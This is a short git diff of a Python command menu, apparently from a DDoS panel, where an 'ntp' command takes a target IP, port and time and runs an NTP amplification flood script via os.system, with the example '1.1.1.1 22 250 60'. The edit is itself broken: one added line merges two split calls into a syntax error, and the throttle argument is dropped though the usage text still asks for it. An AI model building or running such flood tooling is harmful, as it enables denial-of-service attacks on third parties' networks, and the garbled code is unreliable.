@@ -638,11 +638,10 @@ def main():
         elif "ntp" in cnc:
             try:
                 ip = cnc.split()[1]
-                port = cnc.split()[2]
-                throttle = cnc.split()[3]
+                port = cnc.split()[2]cnc.split()[3]
                 time = cnc.split()[4]
                 ascii_vro()
-                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
+                os.system(f'ntp.py {ip} {port} ntp.txt {time}')
             except IndexError:
                 print('Usage: ntp <ip> <port> <throttle> <time>')
                 print('Example: ntp 1.1.1.1 22 250 60')
